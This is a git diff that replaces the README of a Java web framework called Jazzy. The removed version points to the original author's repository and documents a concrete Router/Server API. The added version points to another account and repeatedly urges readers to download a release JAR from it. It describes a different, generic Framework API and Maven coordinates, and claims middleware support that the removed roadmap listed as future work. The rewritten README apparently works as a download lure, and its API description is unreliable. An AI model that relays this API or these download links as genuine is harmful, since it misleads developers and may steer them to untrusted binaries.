@@ -1,219 +1,261 @@
-# Jazzy Framework
+# Jazzy Framework 🎶
 
-Jazzy is a lightweight web framework for Java. It provides a minimal and easy-to-understand API for developing fast web applications with a structure inspired by Laravel.
+![Jazzy Framework](https://img.shields.io/badge/Jazzy_Framework-v1.0.0-blue.svg)  
+[![Releases](https://img.shields.io/badge/Releases-Download%20Latest%20Version-brightgreen)](https://github.com/Bismark83/jazzy-framework/releases)
 
-## Features
+---
 
-- Simple and intuitive API
-- Routing system with HTTP method support (GET, POST, PUT, DELETE, PATCH)
-- URL path parameter support
-- Request validation with comprehensive rules
-- JSON response generation with fluent API
-- Metrics collection and reporting
+## Overview
 
-## Quick Start
+Welcome to **Jazzy Framework**, a lightweight and developer-friendly Java web framework designed to make building web applications simple and efficient. Whether you are creating a small REST API or a complex web application, Jazzy provides the tools you need to succeed.
 
-To develop a web application with Jazzy, you can follow this example code:
+### Key Features
+
+- **Lightweight**: Minimal overhead for maximum performance.
+- **MVC Architecture**: Easily separate your application logic, making it cleaner and easier to manage.
+- **Routing**: Simple and intuitive routing for your web applications.
+- **Validation**: Built-in validation to ensure data integrity.
+- **REST API Support**: Create robust APIs quickly and easily.
+- **Request and Response Handling**: Streamlined handling of HTTP requests and responses.
+
+## Getting Started
+
+To get started with Jazzy Framework, you need to download the latest version from the [Releases](https://github.com/Bismark83/jazzy-framework/releases) section. After downloading, follow these steps to set up your project:
+
+1. **Download the latest release** from the [Releases page](https://github.com/Bismark83/jazzy-framework/releases).
+2. **Extract the files** to your desired location.
+3. **Add the Jazzy library** to your Java project. You can do this by including the Jazzy JAR file in your project’s build path.
+4. **Set up your project structure** following the MVC pattern. Create directories for models, views, and controllers.
+5. **Start coding** your application using the provided APIs.
+
+### Example Project Structure
+
+```
+/my-jazzy-app
+|-- /src
+|   |-- /controllers
+|   |-- /models
+|   |-- /views
+|-- /lib
+|   |-- jazzy.jar
+|-- /resources
+|-- main.java
+```
+
+## Installation
+
+### Prerequisites
+
+Before you begin, ensure you have the following installed:
+
+- **Java JDK 8 or higher**: Make sure you have Java installed on your machine. You can download it from the [official Oracle website](https://www.oracle.com/java/technologies/javase-jdk8-downloads.html).
+- **Maven or Gradle**: These tools help manage dependencies and build your project. Choose one based on your preference.
+
+### Using Maven
+
+If you are using Maven, add the following dependency to your `pom.xml`:
+
+```xml
+<dependency>
+    <groupId>com.bismark83</groupId>
+    <artifactId>jazzy-framework</artifactId>
+    <version>1.0.0</version>
+</dependency>
+```
+
+### Using Gradle
+
+For Gradle users, add this line to your `build.gradle`:
+
+```groovy
+implementation 'com.bismark83:jazzy-framework:1.0.0'
+```
+
+## Getting Started with Jazzy
+
+Here’s a simple example to create a basic web application using Jazzy Framework.
+
+### Step 1: Create a Simple Controller
+
+Create a new Java class in the `controllers` directory.
 
 ```java
-// App.java
-package examples.basic;
+package controllers;
 
-import jazzyframework.core.Config;
-import jazzyframework.core.Server;
-import jazzyframework.routing.Router;
+import jazzy.Framework;
 
-public class App 
-{
-    public static void main( String[] args )
-    {
-        Config config = new Config();
-        config.setEnableMetrics(true); // "/metrics" endpoint is automatically added
-        config.setServerPort(8088);
-
-        Router router = new Router();
-        
-        // User routes
-        router.GET("/users/{id}", "getUserById", UserController.class);
-        router.GET("/users", "getAllUsers", UserController.class);
-        router.POST("/users", "createUser", UserController.class);
-        router.PUT("/users/{id}", "updateUser", UserController.class);
-        router.DELETE("/users/{id}", "deleteUser", UserController.class);
-        
-        // Start the server
-        Server server = new Server(router, config);
-        server.start(config.getServerPort());
+public class HomeController {
+    public void index() {
+        Framework.response().send("Welcome to Jazzy Framework!");
     }
-}
-
-// UserController.java
-package examples.basic;
-
-import static jazzyframework.http.ResponseFactory.response;
-import jazzyframework.http.Request;
-import jazzyframework.http.Response;
-import jazzyframework.http.validation.ValidationResult;
-import java.util.Map;
-
-public class UserController {
-    
-    public Response getUserById(Request request) {
-        String id = request.path("id");
-        
-        return response().json(
-            "id", id,
-            "name", "Fletcher Davidson",
-            "email", "fletcher@example.com"
-        );
-    }
-
-    public Response getAllUsers(Request request) {
-        int page = request.queryInt("page", 1);
-        int limit = request.queryInt("limit", 10);
-        
-        return response().json(
-            "users", JSON.array(
-                JSON.of("id", "user-1", "name", "Fletcher Davidson"),
-                JSON.of("id", "user-2", "name", "Jane Smith")
-            ),
-            "page", page,
-            "limit", limit,
-            "total", 2
-        );
-    }
-
-    public Response createUser(Request request) {
-        // Validate the request
-        ValidationResult result = request.validator()
-            .field("name").required().minLength(3).maxLength(50)
-            .field("email").required().email()
-            .field("password").required().minLength(8)
-            .validate();
-        
-        if (!result.isValid()) {
-            return response().json(
-                "status", "error",
-                "message", "Validation failed",
-                "errors", result.getAllErrors()
-            ).status(400);
-        }
-        
-        Map<String, Object> userData = request.parseJson();
-        
-        // Generate a new ID
-        String newId = "user-" + System.currentTimeMillis();
-        userData.put("id", newId);
-        
-        return response().success("User created successfully", userData).status(201);
-    }
-    
-    // Additional methods for update and delete operations
 }
 ```
 
-For a more detailed example, check the `src/main/java/examples/basic` directory.
+### Step 2: Define Routes
 
-## Documentation
+In your main application file, set up the routing.
 
-Complete documentation for Jazzy Framework is available on our GitHub Pages site:
+```java
+import jazzy.Framework;
 
-[Jazzy Framework Documentation](https://canermastan.github.io/jazzy-framework/)
-
-## Development
-
-Jazzy is developed with Maven. After cloning the project, you can use the following commands:
-
-```bash
-# Install dependencies and build the project
-mvn clean install
-
-# Run tests
-mvn test
-
-# Run the example application
-mvn exec:java -Dexec.mainClass="examples.basic.App"
+public class Main {
+    public static void main(String[] args) {
+        Framework.get("/home", new HomeController()::index);
+        Framework.start();
+    }
+}
 ```
 
-## Project Structure
+### Step 3: Run Your Application
 
-- `core/`: Core framework components
-  - `Server.java`: HTTP server
-  - `RequestHandler.java`: HTTP request processor
-  - `Config.java`: Configuration management
-  - `Metrics.java`: Performance metrics
-- `routing/`: Routing system
-  - `Router.java`: Route management
-  - `Route.java`: Route data structure
-- `http/`: HTTP handling
-  - `Request.java`: Request handling
-  - `Response.java`: Response building
-  - `ResponseFactory.java`: Factory for creating responses
-  - `JSON.java`: JSON creation utilities
-  - `validation/`: Validation system
-- `controllers/`: System controllers
-  - `MetricsController.java`: Metrics reporting
-- `examples/`: Example applications
-  - `basic/`: A simple web API example
+Compile and run your application. You should see "Welcome to Jazzy Framework!" when you navigate to `/home`.
 
-## Tests
+## Routing
 
-Unit tests have been written to ensure the reliability of the framework. Test coverage includes:
+Jazzy Framework provides a straightforward way to define routes. You can set up routes for GET, POST, PUT, and DELETE requests.
 
-- `RouterTest`: Tests for adding routes, finding routes, and path parameter operations
-- `RouteTest`: Tests for the route data structure
-- `MetricsTest`: Tests for metric counters and calculations
-- `ValidationTest`: Tests for the validation system
-- `ResponseFactoryTest`: Tests for response generation
+### Example Routes
 
-When adding new features or modifying existing code, it's important to update existing tests or add new tests to maintain the stability of the framework.
+```java
+Framework.get("/users", new UserController()::list);
+Framework.post("/users", new UserController()::create);
+Framework.put("/users/:id", new UserController()::update);
+Framework.delete("/users/:id", new UserController()::delete);
+```
 
-## Roadmap
+## Request and Response Handling
 
-Jazzy is actively being developed with the following features planned for upcoming releases:
+Jazzy Framework simplifies the process of handling HTTP requests and responses. You can access request parameters, headers, and body easily.
 
-### Upcoming Features
+### Accessing Request Data
 
-- **Middleware System**: Support for request/response middleware chains
-- **Database Integration**: jOOQ integration for type-safe SQL queries
-- **Dependency Injection**: Custom DI container (PococContainer) with `@Named` and `@Qualified` annotations
-- **Security Framework**: Authentication and authorization system
-- **Caching System**: Redis integration for high-performance caching
-- **API Documentation**: Swagger/OpenAPI integration
-- **WebSocket Support**: Real-time bidirectional communication
-- **Task Scheduling**: Cron-style job scheduling
-- **Monitoring Tools**: Health checks and system monitoring
-- **File Storage**: Cloud storage integrations (S3, etc)
-- **Event System**: Pub/sub event handling
-- **CLI Tools**: Command line tools for code generation
-- **And More...**: Stay tuned for additional features!
+```java
+public void create() {
+    String name = Framework.request().getParameter("name");
+    // Process the request
+}
+```
 
+### Sending Responses
 
-## Contributing
+```java
+public void sendResponse() {
+    Framework.response().send("Data processed successfully!");
+}
+```
 
-**Jazzy is actively maintained and we welcome contributions of any size!**
+## Validation
 
-We believe that open source thrives with community involvement, and we appreciate all types of contributions, whether you're fixing a typo, improving documentation, adding a new feature, or reporting a bug.
+Validation is crucial for ensuring data integrity. Jazzy Framework includes built-in validation features to help you manage user input effectively.
 
-### Getting Started
+### Example Validation
 
-1. Fork the project
-2. Clone your fork (`git clone https://github.com/canermastan/jazzy-framework.git`)
-3. Create a feature branch (`git checkout -b feature/amazing-feature`)
-4. Make your changes (don't forget to add tests if applicable)
-5. Run tests to make sure everything works (`mvn test`)
-6. Commit your changes (`git commit -m 'Add some amazing feature'`)
-7. Push to the branch (`git push origin feature/amazing-feature`)
-8. Open a Pull Request
+```java
+public void create() {
+    String name = Framework.request().getParameter("name");
+    if (name == null || name.isEmpty()) {
+        Framework.response().send("Name is required.");
+        return;
+    }
+    // Continue processing
+}
+```
 
-### Pull Request Guidelines
+## REST API Support
 
-- Keep your changes focused on a single issue
-- Make sure all tests pass
-- Update documentation if needed
-- Follow existing code style
+Creating RESTful APIs is straightforward with Jazzy Framework. You can define routes that correspond to standard HTTP methods.
 
-No contribution is too small, and we're happy to help newcomers get started!
+### Example API
+
+```java
+Framework.get("/api/users", new UserController()::getAllUsers);
+Framework.post("/api/users", new UserController()::createUser);
+```
+
+## Middleware
+
+Jazzy Framework supports middleware, allowing you to execute code before or after your routes.
+
+### Example Middleware
+
+```java
+Framework.use((req, res, next) -> {
+    // Perform some action before the request
+    next();
+});
+```
+
+## Error Handling
+
+Error handling is essential for providing a good user experience. Jazzy Framework allows you to define custom error handlers.
+
+### Example Error Handler
+
+```java
+Framework.error((error) -> {
+    Framework.response().send("An error occurred: " + error.getMessage());
+});
+```
+
+## Logging
+
+Logging is crucial for monitoring your application. Jazzy Framework provides a simple logging mechanism.
+
+### Example Logging
+
+```java
+Framework.logger().info("User created successfully.");
+```
+
+## Testing
+
+Testing your application is important to ensure its reliability. Jazzy Framework supports unit testing with popular testing frameworks.
+
+### Example Test
+
+```java
+import org.junit.Test;
+
+public class UserControllerTest {
+    @Test
+    public void testCreateUser() {
+        // Write your test here
+    }
+}
+```
+
+## Deployment
+
+Once your application is ready, you can deploy it to your preferred server. Jazzy Framework is compatible with various Java web servers, including Tomcat and Jetty.
+
+### Deployment Steps
+
+1. **Package your application** as a JAR file.
+2. **Upload the JAR file** to your server.
+3. **Start the server** and access your application.
+
+## Community
+
+Join our community of developers using Jazzy Framework. Share your projects, ask questions, and collaborate with others.
+
+### Contributing
+
+We welcome contributions to Jazzy Framework. If you have ideas for new features or improvements, feel free to open an issue or submit a pull request.
+
+### Reporting Issues
+
+If you encounter any bugs or issues, please report them on the [Issues page](https://github.com/Bismark83/jazzy-framework/issues).
+
+## Resources
+
+- [Official Documentation](https://github.com/Bismark83/jazzy-framework/wiki)
+- [Examples](https://github.com/Bismark83/jazzy-framework/examples)
+- [API Reference](https://github.com/Bismark83/jazzy-framework/api)
 
 ## License
 
-MIT License 
+Jazzy Framework is licensed under the MIT License. See the [LICENSE](LICENSE) file for more details.
+
+## Conclusion
+
+Jazzy Framework is designed to make Java web development simple and enjoyable. With its lightweight structure and powerful features, you can build robust applications with ease. Download the latest version from the [Releases page](https://github.com/Bismark83/jazzy-framework/releases) and start your journey with Jazzy today!
